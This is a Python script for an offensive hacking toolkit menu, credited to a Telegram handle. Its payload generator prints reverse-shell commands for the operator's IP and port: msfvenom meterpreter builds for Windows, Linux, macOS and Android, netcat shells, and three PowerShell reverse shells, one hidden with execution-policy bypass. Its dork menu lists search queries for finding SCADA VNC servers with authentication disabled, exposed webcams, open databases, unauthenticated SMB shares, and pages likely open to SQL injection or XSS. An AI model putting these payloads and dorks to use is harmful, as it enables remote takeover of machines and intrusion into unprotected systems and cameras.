from colorama import Fore
import os
import hashlib
import requests
def clear():
    os.system('clear')
def main():
    clear()
    def banner():
        print(Fore.YELLOW +f"""
    +---------------------------------------------------------+
    |                                                         |
    |                                                         |
    |                ▄██████▄    ▄█     █▄   ▄█               |
    |              ███      ███ ███     ███ ███               |
    |              ███      ███ ███     ███ ███               |
    |              ███      ███ ███     ███ ███               |
    |              ███      ███ ███     ███ ███               |
    |              ███      ███ ███     ███ ███               |
    |              ███      ███ ███ ▄█▄ ███ ███▌    ▄         | 
    |                ▀██████▀    ▀███▀███▀  █████▄▄██         |
    |                                       ▀                 |
    |                                                         |
    |                                                         |
    +---------------------------------------------------------+
    {Fore.YELLOW}| {Fore.RED}Programmer {Fore.WHITE}: {Fore.MAGENTA}Tblak                                      {Fore.YELLOW}|
    {Fore.YELLOW}| {Fore.RED}Version {Fore.WHITE}: {Fore.MAGENTA}1.0.1                                         {Fore.YELLOW}|
    {Fore.YELLOW}| {Fore.RED}Telegram {Fore.WHITE}: {Fore.MAGENTA}@Gigas_TK                                    {Fore.YELLOW}|
    {Fore.YELLOW}+---------------------------------------------------------+                                                         
    |{Fore.RED}             Hello my friend, how are you?               {Fore.YELLOW}|
    {Fore.YELLOW}+---------------------------------------------------------+
    {Fore.WHITE}[{Fore.RED}01{Fore.WHITE}] {Fore.GREEN}Payload Generator
    {Fore.WHITE}[{Fore.RED}02{Fore.WHITE}] {Fore.GREEN}Dorks
    {Fore.WHITE}[{Fore.RED}03{Fore.WHITE}] {Fore.GREEN}Extract page link
    {Fore.WHITE}[{Fore.RED}04{Fore.WHITE}] {Fore.GREEN}Hashing
    {Fore.WHITE}[{Fore.RED}05{Fore.WHITE}] {Fore.GREEN}Contact
    {Fore.WHITE}[{Fore.RED}00{Fore.WHITE}] {Fore.GREEN}Exit

    """)
    banner()
    input_user = input(f"{Fore.GREEN}[{Fore.WHITE}++{Fore.GREEN}]choose an options #>").strip()
    if input_user == '01':
        payload()
    elif input_user == '02':
        dork()
    elif input_user == '03':
        page()
    elif input_user == '04':
        hashing()
    elif input_user == '05':
        contact()
    elif input_user == '00':
        exit



def contact():
    clear()
    print(f"""
{Fore.RED}Github {Fore.WHITE}:{Fore.MAGENTA} 
{Fore.RED}Telegram {Fore.WHITE}: {Fore.MAGENTA}@Gigas_TK
{Fore.RED}Group {Fore.WHITE}: {Fore.MAGENTA} @LEGACYSECURITY
""")
    input()
    main()

def page():
    clear()
    t = input(Fore.WHITE +"Enter link website:").strip()
    api = f'https://api.hackertarget.com/pagelinks/?q={t}'
    req = requests.get(api)
    print(Fore.MAGENTA + f'{Fore.WHITE}[{Fore.RED}*{Fore.WHITE}]',req.text)
    input()
    main()
def hashing():
    clear()
    text = input('Enter your Text:>').strip()
    md5 = hashlib.md5(text.encode())
    print(f"{Fore.RED}MD5{Fore.WHITE} :",Fore.MAGENTA+md5.hexdigest())
    sha1 = hashlib.sha1(text.encode())
    print(f'{Fore.RED}SHA1{Fore.WHITE} :',Fore.MAGENTA+sha1.hexdigest())
    sha256 = hashlib.sha256(text.encode())
    print(f'{Fore.RED}SHA256{Fore.WHITE} :',Fore.MAGENTA+sha256.hexdigest())
    sha224 = hashlib.sha224(text.encode())
    print(f'{Fore.RED}SHA224 {Fore.WHITE}:',Fore.MAGENTA+sha224.hexdigest())
    sha512 = hashlib.sha512(text.encode())
    print(f'{Fore.RED}SHA512 {Fore.WHITE}:',Fore.MAGENTA+sha512.hexdigest())
    t = input(Fore.WHITE+'Enter 00 for back:').strip()
    if t == '00':
        main()
    else:
        hashing()



def payload():
    clear()
    print(f"""
{Fore.WHITE}[{Fore.RED}01{Fore.WHITE}] {Fore.GREEN}Metasploit
{Fore.WHITE}[{Fore.RED}02{Fore.WHITE}] {Fore.GREEN}Netcat
{Fore.WHITE}[{Fore.RED}03{Fore.WHITE}] {Fore.GREEN}PowerShell
{Fore.WHITE}[{Fore.RED}00{Fore.WHITE}] {Fore.GREEN}back      

""")
    ip = input(Fore.WHITE+'your IP:').strip()
    port = input(Fore.WHITE+'Enter PORT:').strip()
    p = input(Fore.WHITE+"Enter number Payload:").strip()
    if p == '01':
        print(f"""
{Fore.WHITE}[{Fore.RED}1{Fore.WHITE}] {Fore.MAGENTA}msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o app.exe
{Fore.WHITE}[{Fore.RED}2{Fore.WHITE}] {Fore.MAGENTA}msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o app.elf
{Fore.WHITE}[{Fore.RED}3{Fore.WHITE}] {Fore.MAGENTA}msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o app.macho
{Fore.WHITE}[{Fore.RED}4{Fore.WHITE}] {Fore.MAGENTA}msfvenom --platform android -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R -o app.apk
""")
        input()
        payload()
    elif p == '02':
        print(f"""
{Fore.WHITE}[{Fore.RED}1{Fore.WHITE}] {Fore.MAGENTA}nc.exe -L -p {port} -e cmd.exe
{Fore.WHITE}[{Fore.RED}2{Fore.WHITE}] {Fore.MAGENTA}nc {ip} {port}
""")
        input()
        payload()
    elif p == '03':
        print(Fore.RED+"Note : Put the ip and port in the specified places (it is only necessary for this payload, the rest of the payloads are not needed, they will be placed automatically)")
        
        print(Fore.MAGENTA+"""
[1] - $LHOST = "{ip}"; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()

              
[2] -  powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

                    
[3] -  powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
""")
        input()
        payload()
    elif p == '00':
        main()


def dork():
    clear()
    print(f"""
{Fore.WHITE}[{Fore.RED}01{Fore.WHITE}]{Fore.GREEN} Scada (SHODAN)
{Fore.WHITE}[{Fore.RED}02{Fore.WHITE}]{Fore.GREEN} sql injection
{Fore.WHITE}[{Fore.RED}03{Fore.WHITE}] {Fore.GREEN}XSS
{Fore.WHITE}[{Fore.RED}04{Fore.WHITE}] {Fore.GREEN}admin page
{Fore.WHITE}[{Fore.RED}05{Fore.WHITE}] {Fore.GREEN}camera(CCTV) -> (SHODAN AND GOOGLE)
{Fore.WHITE}[{Fore.RED}06{Fore.WHITE}]{Fore.GREEN} OS (SHODAN)
{Fore.WHITE}[{Fore.RED}07{Fore.WHITE}] {Fore.GREEN}mysql (SHODAN)
{Fore.WHITE}[{Fore.RED}08{Fore.WHITE}] {Fore.GREEN}smb (SHODAN)
{Fore.WHITE}[{Fore.RED}00{Fore.WHITE}] {Fore.GREEN}back
""")
    t = input(Fore.WHITE+"Enter number:").strip()
    if t == '01':
        print(Fore.MAGENTA+f"""
port: 5900 gas
port: 5900 water
port:5900 RFB 003.008 Authentication disabled
""")
        input()
        dork()
    elif t == '02':
        print(Fore.MAGENTA+f"""
 view_items.php?id=
 home.php?cat=
 item_book.php?CAT=
 www/index.php?page=
 schule/termine.php?view=
 goods_detail.php?data=
 storemanager/contents/item.php?page_code=
 view_items.php?id=
 customer/board.htm?mode=
 help/com_view.html?code=
 n_replyboard.php?typeboard=
 eng_board/view.php?T****=
 prev_results.php?prodID=
 bbs/view.php?no=
 gnu/?doc=
 zb/view.php?uid=
 global/product/product.php?gubun=
 m_view.php?ps_db=
 productlist.php?tid=
 product-list.php?id=
 onlinesales/product.php?product_id=
 garden_equipment/Fruit-Cage/product.php?pr=
 product.php?shopprodid=
 product_info.php?products_id=
 productlist.php?tid=
 showsub.php?id=
 productlist.php?fid=
 products.php?cat=
 products.php?cat=
 product-list.php?id=
 product.php?sku=
 store/product.php?productid=
 products.php?cat=
 productList.php?cat=
 product_detail.php?product_id=
 product.php?pid=
 view_items.php?id=
 more_details.php?id=
 county-facts/diary/vcsgen.php?id=
 idlechat/message.php?id=
 podcast/item.php?pid=
 products.php?act=
 details.php?prodId=
 socsci/events/full_details.php?id=
 ourblog.php?categoryid=
 mall/more.php?ProdID=
 archive/get.php?message_id=
 review/review_form.php?item_id=
 english/publicproducts.php?groupid=
 news_and_notices.php?news_id=
 rounds-detail.php?id=
 gig.php?id=
 board/view.php?no=
 index.php?modus=
 news_item.php?id=
 rss.php?cat=
 products/product.php?id=
 details.php?ProdID=
 els_/product/product.php?id=
 store/description.php?iddesc=
 socsci/news_items/full_story.php?id=
 naboard/memo.php?bd=
 bookmark/mybook/bookmark.php?bookPageNo=
 board/board.html?table=
 kboard/kboard.php?board=
 order.asp?lotid=
 goboard/front/board_view.php?code=
 bbs/bbsView.php?id=
 boardView.php?bbs=
 eng/rgboard/view.php?&bbs_id=
 product/product.php?cate=
 content.php?p=
 page.php?module=
 ?pid=
 bookpage.php?id=
 cbmer/congres/page.php?LAN=
 content.php?id=
 news.php?ID=
 photogallery.php?id=
 index.php?id=
 product/product.php?product_no=
 nyheder.htm?show=
 book.php?ID=
 print.php?id=
 detail.php?id=
 book.php?id=
 content.php?PID=
 more_detail.php?id=
 content.php?id=
 view_items.php?id=
 view_author.php?id=
 main.php?id=
 english/fonction/print.php?id=
 magazines/adult_magazine_single_page.php?magid=
 product_details.php?prodid=
 magazines/adult_magazine_full_year.php?magid=
 products/card.php?prodID=
 catalog/product.php?cat_id=
 e_board/modifyform.html?code=
 community/calendar-event-fr.php?id=
 products.php?p=
 news.php?id=
 StoreRedirect.php?ID=
 subcategories.php?id=
 tek9.php?
 template.php?Action=Item&pid=
 topic.php?ID=
 tuangou.php?bookid=
 type.php?iType=
 updatebasket.php?bookid=
 updates.php?ID=
 view.php?cid=
 view_cart.php?title=
 view_detail.php?ID=
 viewcart.php?CartId=
 viewCart.php?userID=
 viewCat_h.php?idCategory=
 viewevent.php?EventID=
 viewitem.php?recor=
 viewPrd.php?idcategory=
 ViewProduct.php?misc=
 voteList.php?item_ID=
 whatsnew.php?idCategory=
 WsAncillary.php?ID=
 WsPages.php?ID=noticiasDetalle.php?xid=
 sitio/item.php?idcd=
 index.php?site=
 de/content.php?page_id=
 gallerysort.php?iid=
 docDetail.aspx?chnum=
 index.php?section=
 index.php?page=
 index.php?page=
 en/publications.php?id=
 events/detail.php?ID=
 forum/profile.php?id=
 media/pr.php?id=
 content.php?ID=
 cloudbank/detail.php?ID=
 pages.php?id=
 news.php?id=
 beitrag_D.php?id=
 content/index.php?id=
 index.php?i=
 ?action=
 index.php?page=
 beitrag_F.php?id=
 index.php?pageid=
 page.php?modul=
 detail.php?id=
 index.php?w=
 index.php?modus=
 news.php?id=
 news.php?id=
 aktuelles/meldungen-detail.php?id=
 item.php?id=
 obio/detail.php?id=
 page/de/produkte/produkte.php?prodID=
 packages_display.php?ref=
 shop/index.php?cPath=
 modules.php?bookid=
 view/7/9628/1.html?reply=
 product_details.php?prodid=
 catalog/product.php?pid=
 rating.php?id=
 ?page=
 catalog/main.php?cat_id=
 index.php?page=
 detail.php?prodid=
 products/product.php?pid=
 news.php?id=
 book_detail.php?BookID=
 catalog/main.php?cat_id=
 catalog/main.php?cat_id=
 default.php?cPath=
 catalog/main.php?cat_id=
 catalog/main.php?cat_id=
 category.php?catid=
 categories.php?cat=
 categories.php?cat=
 detail.php?prodID=
 detail.php?id=
 category.php?id=
 hm/inside.php?id=
 index.php?area_id=
 gallery.php?id=
 products.php?cat=
 products.php?cat=
 media/pr.php?id=
 books/book.php?proj_nr=
 products/card.php?prodID=
 general.php?id=
 news.php?t=
 usb/devices/showdev.php?id=
 content/detail.php?id=
 templet.php?acticle_id=
 news/news/title_show.php?id=
 product.php?id=
 index.php?url=
 cryolab/content.php?cid=
 ls.php?id=
 s.php?w=
 abroad/page.php?cid=
 bayer/dtnews.php?id=
 news/temp.php?id=
 index.php?url=
 book/bookcover.php?bookid=
 index.php/en/component/pvm/?view=
 product/list.php?pid=
 cats.php?cat=
 software_categories.php?cat_id=
 print.php?sid=
 about.php?cartID=
 accinfo.php?cartId=
 acclogin.php?cartID=
 add.php?bookid=
 add_cart.php?num=
 addcart.php?
 addItem.php
 add-to-cart.php?ID=
 addToCart.php?idProduct=
 addtomylist.php?ProdId=
 adminEditProductFields.php?intProdID=
 advSearch_h.php?idCategory=
 affiliate.php?ID=
 affiliate-agreement.cfm?storeid=
 affiliates.php?id=
 ancillary.php?ID=
 archive.php?id=
 article.php?id=
 phpx?PageID
 basket.php?id=
 Book.php?bookID=
 book_list.php?bookid=
 book_view.php?bookid=
 BookDetails.php?ID=
 browse.php?catid=
 browse_item_details.php
 Browse_Item_Details.php?Store_Id=
 buy.php?
 buy.php?bookid=
 bycategory.php?id=
 cardinfo.php?card=
 cart.php?action=
 cart.php?cart_id=
 cat/?catid=
 products/product-list.php?id=
 debate-detail.php?id=
 /calendar.php?l= calendar.php?l=”
 /calendar.php?l= calendar.php?l=
 /calendar.php?p= calendar.php?p=”
 /calendar.php?p= calendar.php?p=
 /calendar.php?pg= calendar.php?pg=”
 /calendar.php?pg= calendar.php?pg=
 /calendar.php?s= calendar.php?s=”
 /calendar.php?s= calendar.php?s=
 .php?subd=”
 .php?subdir=”
 .php?category=”
 .php?choice=”
 .php?class=”
 .php?club_id=”
 .php?cod.tipo=”
 .php?cod=”
 .php?conf=”
 .php?configFile=”
 .php?cont=”
 .php?corpo=”
 .php?cvsroot=”
 .php?d=”
 .php?da=”
 .php?date=”
 .php?debug=”
 .php?debut=”
 .php?default=”
 .php?destino=”
 .php?dir=”
 .php?display=”
 .php?file_id=”
 .php?file=”
 .php?filepath=”
 .php?flash=”
 .php?folder=”
 .php?for=”
 .php?form=”
 .php?formatword=”
 .php?funcao=”
 .php?function=”
 .php?g=”
 .php?get=”
 .php?go=”
 .php?gorumDir=”
 .php?goto=”
 .php?h=”
 .php?headline=”
 .php?i=”
 .php?inc=”
 .php?include=”
 .php?includedir=”
 .php?inter=”
 .php?itemid=”
 .php?j=”
 .php?join=”
 .php?jojo=”
 .php?l=”
 .php?lan=”
 .php?lang=”
 .php?link=”
 .php?load=”
 .php?loc=”
 .php?m=”
 .php?main=”
 .php?meio.php=”
 .php?meio=”
 .php?menu=”
 .php?menuID=”
 .php?mep=”
 .php?month=”
 .php?mostra=”
 .php?n=”
 .php?name=”
 .php?nav=”
 .php?new=”
 .php?news=”
 .php?next=”
 .php?nextpage=”
 .php?o=”
 .php?op=”
 .php?open=”
 .php?option=”
 .php?origem=”
 .php?Page_ID=”
 .php?pageurl=”
 .php?para=”
 .php?part=”
 .php?pg=”
 .php?pid=”
 .php?place=”
 .php?play=”
 .php?plugin=”
 .php?pm_path=”
 .php?pollname=”
 .php?post=”
 .php?pr=”
 .php?prefix=”
 .php?prefixo=”
 .php?q=”
 .php?redirect=”
 .php?ref=”
 .php?refid=”
 .php?regionId=”
 .php?release_id=”
 .php?release=”
 .php?return=”
 .php?root=”
 .php?S=”
 .php?searchcode_id=”
 .php?sec=”
 .php?secao=”
 .php?sect=”
 .php?sel=”
 .php?server=”
 .php?servico=”
 .php?sg=”
 .php?shard=”
 .php?show=”
 .php?sid=”
 .php?site=”
 .php?sourcedir=”
 .php?start=”
 .php?storyid=”
 .php?str=”
 .php?subject=”
 .php?sufixo=”
 .php?systempath=”
 .php?t=”
 .php?task=”
 .php?teste=”
 .php?theme_dir=”
 .php?thread_id=”
 .php?tid=”
 .php?title=”
 .php?to=”
 .php?topic_id=”
 .php?type=”
 .php?u=”
 .php?url=”
 .php?urlFrom=”
 .php?v=”
 .php?var=”
 .php?vi=”
 .php?view=”
 .php?visual=”
 .php?wPage=”
 .php?y=”
 releases_headlines_details.php?id=
 store_bycat.php?id=
 store_listing.php?id=
 Store_ViewProducts.php?Cat=
 store-details.php?id=
 storefront.php?id=
 storefronts.php?title=
 storeitem.php?item=
 products.php?type=
 books.php?id=
 index.php?offs=
 mboard/replies.php?parent_id=
 Computer Science.php?id=
 news.php?id=
 pdf_post.php?ID=
 reviews.php?id=
 art.php?id=
 prod.php?cat=
 event_info.php?p=
 library.php?cat=
 categories.php?cat=
 page.php?area_id=
 categories.php?cat=
 publications.php?id=
 item.php?sub_id=
 page.php?area_id=
 page.php?area_id=
 category.php?catid=
 content.php?cID=
 newsitem.php?newsid=
 frontend/category.php?id_category=
 news/newsitem.php?newsID=
 things-to-do/detail.php?id=
 page.php?area_id=
""")
        input()
        dork()
    elif t == '03':
        print(Fore.MAGENTA+f"""
              
inurl:& inurl:test
inurl:& inurl:quiz
inurl:& inurl:survey
inurl:& inurl:game
inurl:& inurl:competition
inurl:& inurl:form
inurl:& inurl:title
inurl:& inurl:search
inurl:& inurl:city
inurl:& inurl:date
inurl:& inurl:topic
inurl:& inurl:search inurl:q
inurl:& inurl:search inurl:s
index.php? inurl:& 
inurl:search
inurl:suche
inurl:page
inurl:& inurl:query
inurl:& inurl:suche
inurl:& inurl:input
inurl:& inurl:next
inurl:& inurl:target
inurl:search inurl:page
inurl:search inurl:p
inurl:query filetype:html inurl:page
inurl:query filetype:html inurl:sort
inurl:query filetype:php
inurl:".php?cmd="
inurl:".php?z="
inurl:".php?q="
inurl:".php?search="
inurl:".php?query="
inurl:".php?searchst­ring="
inurl:".php?keyword=­"
inurl:".php?file="
inurl:".php?years="
inurl:".php?txt="
inurl:".php?tag="
inurl:".php?max="
inurl:".php?from="
inurl:".php?author="
inurl:".php?pass="
inurl:".php?feedback­="
inurl:".php?mail="
inurl:".php?cat="
inurl:".php?vote="
inurl:search.php?q=
inurl:com_feedpostol­d/feedpost.php?url=
inurl:scrapbook.php?­id=
inurl:headersearch.p­hp?sid=
inurl:/poll/­default.asp?catid=
inurl:/­search_results.php?se­arch=
inurl:categoryId inurl:storeId (2 million results)
inurl:resultCatEntryType
inurl:searchTermScope
inurl:”webapp/wcs”
inurl:”ProductListingView”
inurl:”AdvancedSearchDisplay”
inurl:”CompareProductsDisplayView”
inurl:parent_category_rn
""")
        input()
        dork()
    elif t == '04':
        print(Fore.MAGENTA+f"""
site: target.com inurl: admin |  administrator |  adm |  login |  l0gin |  wp-login
inurl:wp-login
inurl:login
inurl:user-login
inurl:"/wp-login.php?action=lostpassword"
inurl:& intext:admin intext:login
site:password.*.* intitle:"login"
site:portal.*.* intitle:"login"
site:sftp.*.*/ intext:"login" intitle:"server login"
site:user.*.* intitle:"login"
"Joomla! Administration Login" inurl:"/index.php"
intext:Joomla 1.6 inurl:index.php/login
intitle:"grafana" inurl:"/grafana/login" "Forgot your password"
inurl:login "Welcome to Grafana"
php jembut.php "/account/login/"
php jembut.php "/customer/account/login/referer/"
intext:"HostingAccelerator" intitle:"login" +"Username" -"news" -demo
intext:"IMail Server Web Messaging" intitle:login
inurl:/eftclient/account/login.htm
inurl:/pro_users/login
inurl:"servicedesk/customer/user/login"
inurl:"/phpmyadmin/user_password.php
inurl:"/?q=user/password/"
"Login Pages":"site:target.com inurl:login | inurl:signin | intitle:Login | intitle: signin | inurl:auth"
inurl:"/carbon/admin/login.jsp"
inurl:webvpn.html "login" "Please enter your"
inurl:/administrator/index.php?autologin=1
"login" "user" "password"
""")
        input()
        dork()
    elif t == '05':
        print(Fore.MAGENTA+f"""
inurl:view/view.shtml
inurl:/view.shtml
intitle:”Live View / - AXIS” | inurl:view/view.shtml^
inurl:ViewerFrame?Mode=
inurl:ViewerFrame?Mode=Refresh
inurl:axis-cgi/jpg
inurl:axis-cgi/mjpg (motion-JPEG)
inurl:view/indexFrame.shtml
inurl:view/index.shtml
intitle:start inurl:cgistart
intitle:”live view” intitle:axis
intitle:snc-z20 inurl:home/
intitle:liveapplet
intitle:”i-Catcher Console - Web Monitor”
intitle:axis intitle:”video server”
intitle:liveapplet inurl:LvAppl
intitle:”EvoCam” inurl:”webcam.html”
intitle:”Live NetSnap Cam-Server feed”
intitle:”Live View / - AXIS”
intitle:”Live View / - AXIS 206W”
intitle:”Live View / - AXIS 210″
inurl:indexFrame.shtml Axis
intitle:”Live View / - AXIS 206M”
inurl:”MultiCameraFrame?Mode=Motion”
allintitle:”Network Camera NetworkCamera”
intitle:”WJ-NT104 Main Page”
intext:”MOBOTIX M1″ intext:”Open Menu”
intext:”MOBOTIX M10″ intext:”Open Menu”
intext:”MOBOTIX D10″ intext:”Open Menu”
intitle:”netcam live image”
intitle:snc-cs3 inurl:home/
intitle:snc-rz30 inurl:home/
intitle:”sony network camera snc-p1″
intitle:”sony network camera snc-m1″
site:.viewnetcam.com -www.viewnetcam.com
intitle:”Toshiba Network Camera” user login
+ View Webcam User Accessing
allinurl:control/multiview
intitle:”supervisioncam protocol”
webcam has_screenshot:true
title:camera
("webcam 7" OR "webcamXP") http.component:"mootools" -401
"Server: IP Webcam Server" "200 OK"
http.title:"WEB VIEW"
http.title:"Webcam"
product:"Hikvision IP Camera"
"Server: yawcam" "Mime-Type: text/html"
""")
        input()
        dork()
    elif t == '06':
        print(Fore.MAGENTA+f"""
##SHODAN DORK
os:"windows 7" 
os:"windows server 2012"
os:"linux 3.x"
device:firewall
device:router 
device:wap 
device:webcam 
device:media
device:"broadband router" 
device:pbx 
device:printer 
device:switch 
device:phone 
device:"voip" 
device:"voip phone" 
device:"voip adaptor" 
device:"load balancer"
device:"print server"
device:terminal 
device:bridge
""")
        input()
        dork()
    elif t == '07':
        print(Fore.WHITE+"""
##SHODAN DORK
"product:MySQL" 
mysql port:"3306"
"product:MongoDB"
mongodb port:27017
"port:5432 PostgreSQL"
"MongoDB Server Information { "metrics":" "Set-Cookie: mongo-express=" "200 OK" "MongoDB Server Information" port:27017 -authentication
port:9200 json port:"9200" all:elastic port:"9200" all:"elastic indices"
"product:CouchDB" port:"5984"+Server: "CouchDB/2.1.0"
""")
        input()
        dork()
    elif t == '08':
        print(Fore.MAGENTA+f"""
##SHODAN DORK
"Authentication: disabled" port:445
"Authentication: disabled" NETLOGON SYSVOL -unix port:445
"Authentication: disabled" "Shared this folder to access QuickBooks files OverNetwork" -unix port:445
""")
        input()
        dork()
    elif t == '00':
        main()
main()